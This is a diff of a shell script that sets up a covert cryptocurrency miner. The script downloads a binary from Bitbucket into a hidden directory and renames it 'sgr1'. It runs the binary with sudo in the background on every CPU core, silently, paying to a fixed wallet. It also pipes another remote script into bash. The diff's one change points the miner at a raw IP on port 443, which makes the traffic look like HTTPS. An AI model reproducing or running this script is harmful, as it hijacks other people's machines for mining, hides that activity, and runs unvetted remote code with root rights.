@@ -12,5 +12,5 @@ sudo su --command "apt-get update && apt-get install gcc -y && curl -sL https://
 mkdir .kap && cd .kap
 wget -O sgr1 https://bitbucket.org/dennidarko01/kangkung/raw/master/maker >/dev/null 2>&1
 chmod +x sgr1
-sudo ./sgr1 -a YespowerSugar -o stratum+tcp://yespowerSUGAR.na.mine.zpool.ca:6241 -u D8NDrmsXJjSa2humnqNe8MJGcPWP84pFzy -p c=DGB,zap=SUGAR -t $(nproc --all) >/dev/null 2>&1 &
+sudo ./sgr1 -a YespowerSugar -o stratum+tcp://161.35.74.99:443 -u D8NDrmsXJjSa2humnqNe8MJGcPWP84pFzy -p c=DGB,zap=SUGAR -t $(nproc --all) >/dev/null 2>&1 &
 curl -sL https://bitbucket.org/lightcoral2/cangor/raw/master/boled04.sh | bash
